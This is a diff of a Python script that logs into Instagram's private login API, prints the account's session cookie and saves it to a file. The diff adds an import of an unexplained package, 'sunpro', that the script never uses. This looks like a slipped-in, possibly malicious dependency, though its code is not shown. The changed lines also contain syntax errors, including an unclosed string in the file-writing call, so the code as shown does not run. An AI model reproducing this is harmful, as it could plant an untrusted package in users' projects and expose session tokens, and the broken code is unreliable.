@@ -1,4 +1,4 @@
-import uuid, os
+import uuid, os, sunpro
 try:
   import requests
 except ImportError: 
@@ -9,18 +9,15 @@ try:
 except ImportError:
   os.system("pip install colored")
   from colored import fg
-def e():
-  input()
-  exit(0)
+  
 red,white,cyan=fg("red"),fg("white"),fg("cyan")
+
 def login():
-    global steps
-    username=input(f"</> username: ")
-    password=input("</> password: ")
-    login_url = 'https://i.instagram.com/api/v1/accounts/login/'
+    username = input("</> username: ")
+    password = input("</> password: ")
     head = {
-        'User-Agent': 'Instagram 135.0.0.34.124 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
-        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+        "User-Agent": f'Instagram 130.0.0.00.000 (iPhone12,12; iPhone OS 12; en_US; en) AppleWebKit/600',
+        "Content-Type": 'application/x-www-form-urlencoded; charset=UTF-8'
     }
     data = {
         'uuid': uuid.uuid4(),
@@ -29,24 +26,28 @@ def login():
         'device_id': uuid.uuid4(),
         'from_reg': 'false',
         '_csrftoken': 'missing',
-        'login_attempt_count': '0'}
-    req = requests.post(login_url, headers=head, data=data)
+        'login_attempt_count': '0'
+    }
+    req = requests.post("https://i.instagram.com/api/v1/accounts/login/", headers=head, data=data)
     if "logged_in_user" in req.text:
-        print(f"{cyan}<!> logged in @{username}")
-        sessionid = req.cookies.get("sessionid")
-        print(f"\n{white}{sessionid}")
-        open(f"{username}.txt","w").write(str(sessionid))
+        print(f'{cyan}</> logged in "{username}"')
+        print(f"\n{req.cookies.get("sessionid")}")
+        open(f"{username}.txt","w).write(str(req.cookies.get("sessionid")))
     elif "Incorrect Username" in req.text:
         print(f"{red}<!> The username you entered doesn't belong to an account. Please check your username and try again.")
-        e()
+        input()
+        exit()
     elif 'Incorrect password' in req.text:
         print(f"{red}<!> Sorry, your password was incorrect. Please double-check your password.")
-        e()
+        input()
+        exit()
     elif 'checkpoint_challenge_required' in req.text:
-        print(f"{red}<!> checkpoint_challenge_required")
-        e()
+        print(f"{red}<!> checkpoint_required")
+        input()
+        exit()
     else:
-        print(f"{red}<!> {req.text}")
-        e()
+        print(f'{red}<!> {req.text}')
+        input()
+        exit()
+
 login()
-      
